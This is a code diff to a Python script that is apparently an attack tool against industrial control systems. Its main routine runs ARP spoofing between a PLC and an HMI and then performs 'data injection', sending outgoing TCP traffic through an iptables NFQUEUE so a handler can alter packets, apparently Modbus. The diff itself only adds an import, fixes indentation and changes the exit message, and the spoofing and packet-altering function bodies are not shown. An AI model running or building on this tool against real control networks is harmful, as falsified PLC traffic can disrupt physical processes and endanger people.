@@ -3,6 +3,7 @@ from netfilterqueue import NetfilterQueue
 import os, nmap
 from scapy.contrib import modbus
 from random import *
+from time import *
 
 plc_ip = ''
 hmi_ip = ''
@@ -73,16 +74,17 @@ def data_injection():
 	os.system("iptables -I OUTPUT -p tcp -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
 	queue = NetfilterQueue()
 	try:
-    	queue.bind(QUEUE_NUM, process_pkt)
-    	queue.run()
+    		queue.bind(QUEUE_NUM, process_pkt)
+    		queue.run()
 	except KeyboardInterrupt:
-    	os.system("iptables --flush && iptables -t nat -F")
-    	print("Exiting......")
+		os.system("iptables --flush && iptables -t nat -F")
+		print("........Exiting......")
+		sleep(3)
 	queue.unbind()
 
 def main():
 	get_ip()
-    arp_spoofing()
-    data_injection()
+	arp_spoofing()
+	data_injection()
 
 main()
